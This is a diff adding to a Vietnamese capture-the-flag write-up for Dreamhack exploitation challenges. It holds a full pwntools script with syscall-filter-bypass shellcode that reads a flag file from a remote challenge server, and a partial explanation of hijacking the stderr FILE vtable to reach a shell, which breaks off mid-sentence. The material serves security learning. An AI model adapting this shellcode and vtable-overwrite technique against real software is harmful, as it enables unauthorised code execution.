@@ -114,20 +114,20 @@ shellcode = asm("""
                 push rax
                 mov rax, 0x79622f656d6f682f
                 push rax
-                
+
                 mov rsi, rsp
                 xor rdi, rdi
                 xor rdx, rdx
                 mov rax, 0x101
                 syscall
-                
+
                 mov rdi, 0x1
                 mov r10, 0x64
                 xor edx, edx
                 mov rsi, rax
                 mov rax, 0x28
                 syscall
-                
+
                 """)
 
 # shellcode = shellcraft.openat(0,'/home/bypass_syscall/flag')
@@ -139,3 +139,166 @@ p.interactive()
 
 ## Kết quả
 
+![image](https://user-images.githubusercontent.com/111769169/233920506-446bc95b-2dfb-4e0b-8af1-1e0db8040867.png)
+
+```python
+from pwn import *
+
+# p = process('./bypass_syscall')
+p = remote('host3.dreamhack.games', 22430)
+
+context.arch = 'x86_64'
+# gdb.attach(p, gdbscript= '''
+#            b*main+154
+#            c
+#            ''')
+shellcode = asm("""
+                push 0x67
+                mov rax, 0x616c662f6c6c6163
+                push rax
+                mov rax, 0x7379735f73736170
+                push rax
+                mov rax, 0x79622f656d6f682f
+                push rax
+
+                mov rsi, rsp
+                xor rdi, rdi
+                xor rdx, rdx
+                mov rax, 0x101
+                syscall
+
+                mov rdi, 0x1
+                mov r10, 0x64
+                xor edx, edx
+                mov rsi, rax
+                mov rax, 0x28
+                syscall
+
+                """)
+
+# shellcode = shellcraft.openat(0,'/home/bypass_syscall/flag')
+# shellcode += shellcraft.sendfile(1,'rax',0,100)
+
+p.sendlineafter(b': ', (shellcode))
+p.interactive()
+```
+
+# iofile_vtable
+
+## Source
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+char name[8];
+void alarm_handler() {
+    puts("TIME OUT");
+    exit(-1);
+}
+
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    signal(SIGALRM, alarm_handler);
+    alarm(60);
+}
+
+void get_shell() {
+    system("/bin/sh");
+}
+int main(int argc, char *argv[]) {
+    int idx = 0;
+    int sel;
+
+    initialize();
+
+    printf("what is your name: ");
+    read(0, name, 8);
+    while(1) {
+        printf("1. print\n");
+        printf("2. error\n");
+        printf("3. read\n");
+        printf("4. chance\n");
+        printf("> ");
+
+        scanf("%d", &sel);
+        switch(sel) {
+            case 1:
+                printf("GOOD\n");
+                break;
+            case 2:
+                fprintf(stderr, "ERROR\n");
+                break;
+            case 3:
+                fgetc(stdin);
+                break;
+            case 4:
+                printf("change: ");
+                read(0, stderr + 1, 8);
+                break;
+            default:
+                break;
+            }
+    }
+    return 0;
+}
+```
+
+## Ý tưởng
+
+- Ban đầu em tính ở option 4 ta sẽ nhập vào địa chỉ của `get_shell` và chọn option 2 để thực thi đến hàm `get_shell` nhưng có vẻ nó không được
+
+- Em tham khảo wu thì em nhận thấy ở `stderr + 1` chứa địa chỉ
+
+```
+gef➤  p stderr+1
+$6 = (FILE *) 0x7ffff7fa3778 <_IO_2_1_stderr_+216>
+```
+
+- Ở địa chỉ `stderr+1` chứa địa chỉ của `_IO_file_jump`
+
+```
+gef➤  x/xg 0x7ffff7fa3778
+0x7ffff7fa3778 <_IO_2_1_stderr_+216>:   0x00007ffff7f9f600
+gef➤  x/xg 0x00007ffff7f9f600
+0x7ffff7f9f600 <_IO_file_jumps>:        0x0000000000000000
+```
+
+- Khi này em kiểm tra hàm `_IO_file_jump` ta thấy như sau
+
+  - Khi chọn option 2 hàm fprintf sẽ thực thi `__xsputn = 0x7ffff7e14680 <_IO_new_file_xsputn>,`
+  - vậy nếu như ta đưa địa chỉ shell vào `name` sau đó ở option 4 ta đưa địa chỉ name vào và chọn option 2 nó sẽ thực thi `__xsputn`
+
+- Để rõ hơn ta sẽ như sau, ta có chức năng để sửa địa chỉ `+216` thành một địa chỉ ví dụ là `0x1122334455667788`
+
+- Khi này ta có như sau 
+`0x7ffff7fa3778 <_IO_2_1_stderr_+216>:   0x1122334455667788`
+- Vì nó không kiểm tra đia chỉ `0x1122334455667788` có phải là địa chỉ của `_IO_file_jumps` không mà nó cứ truy cập vào địa chỉ đó và nó nhớ offset của `__xsputn` là `?` và nó sẽ lấy `0x1122334455667788 + ?` và thực thi tại địa chỉ được cộng thêm offset
+
+- Oke vậy nếu ta đưa địa chỉ `shell - ?` vào thì không được vì
+```
+gef➤  x/xg 0x7ffff7fa3778
+0x7ffff7fa3778 <_IO_2_1_stderr_+216>:   shell - ?
+gef➤  x/xg 0x00007ffff7f9f600
+0x7ffff7f9f600 <_IO_file_jumps+?>:        shell
+
+shell: ????
+```
+
+- Nó khá khó giải thích, em chỉ hiểu chỗ `shell: ????` nó sẽ thực thi `????` là 1 địa chỉ. Vậy ta sẽ thông qua `name` để đưa shell vào, nó sẽ hoạt động như sau
+
+```
+gef➤  x/xg 0x7ffff7fa3778
+0x7ffff7fa3778 <_IO_2_1_stderr_+216>:   name - ?
+gef➤  x/xg 0x00007ffff7f9f600
+0x7ffff7f9f600 <_IO_file_jumps+?>:        name
+
+name: shell
+```
+
+- Đó trông có vẻ ổn áp hơn r =))
+- Bây giờ tìm `?` như nào =))
+- Ta biết nó hoạt động `
